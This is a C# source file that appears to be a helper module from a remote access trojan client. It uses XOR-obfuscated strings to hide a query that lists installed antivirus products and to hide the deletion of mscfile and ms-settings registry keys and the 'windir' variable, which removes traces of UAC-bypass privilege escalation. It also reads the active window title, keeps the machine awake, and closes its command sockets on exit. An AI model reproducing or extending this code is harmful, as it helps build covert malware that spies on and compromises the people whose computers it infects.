using System;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Microsoft.Win32;
using static Peg.ICARUS.Askhshs;

namespace Peg.ICARUS
{
    public static class Me8odos
    {
        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void ClientOnExit()
        {
            try
            {
                if (Convert.ToBoolean(Settings.ODBS) && IsAdmin())
                    Prostasia.Exit();
                MutexControl.CloseMutex();
                PegSock.SslClient?.Close();
                PegSock.TcpClient?.Close();
            }
            catch
            {
            }
        }

        public static string Antivirus()
        {
            try
            {
                var firewallName = string.Empty;


                using (var searcher = new ManagementObjectSearcher(
                           @"\\" + Environment.MachineName + @"\root\SecurityCenter2",
                           thebook("Yofoi~* *lxeg*Kd~c|cxyZxeni~")))
                {
                    foreach (ManagementObject mObject in searcher.Get()) firewallName += mObject["displayName"] + "; ";
                }

                firewallName = RemoveLastChars(firewallName);

                return !string.IsNullOrEmpty(firewallName) ? firewallName : "N/A";
            }
            catch
            {
                return "Unknown";
            }
        }

        public static string thebook(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();

            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static string RemoveLastChars(string input, int amount = 2)
        {
            if (input.Length > amount)
                input = input.Remove(input.Length - amount);
            return input;
        }

        public static ImageCodecInfo GetEncoder(ImageFormat format)
        {
            var codecs = ImageCodecInfo.GetImageDecoders();
            foreach (var codec in codecs)
                if (codec.FormatID == format.Guid)
                    return codec;
            return null;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

        public static void PreventSleep()
        {
            try
            {
                SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED | EXECUTION_STATE.ES_CONTINUOUS |
                                        EXECUTION_STATE.ES_DISPLAY_REQUIRED);
            }
            catch
            {
            }
        }

        public static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                var buff = new StringBuilder(nChars);
                var handle = GetForegroundWindow();
                if (GetWindowText(handle, buff, nChars) > 0) return buff.ToString();
            }
            catch
            {
            }

            return "";
        }

        public static void ClearSetting()
        {
            try
            {
                RegistryKey key;
                key = Registry.CurrentUser.CreateSubKey("Environment");
                if (key.GetValue("windir") != null) key.DeleteValue("windir");

                key.Close();
            }
            catch
            {
            }

            try
            {
                Registry.CurrentUser.OpenSubKey(thebook("Yel~}kxo"), true).OpenSubKey(thebook("Ifkyyoy"), true)
                    .DeleteSubKeyTree(thebook("gyilcfo"));
            }
            catch
            {
            }

            try
            {
                Registry.CurrentUser.OpenSubKey(thebook("Yel~}kxo"), true).OpenSubKey(thebook("Ifkyyoy"), true)
                    .DeleteSubKeyTree(thebook("gy'yo~~cdmy"));
            }
            catch
            {
            }
        }
    }
}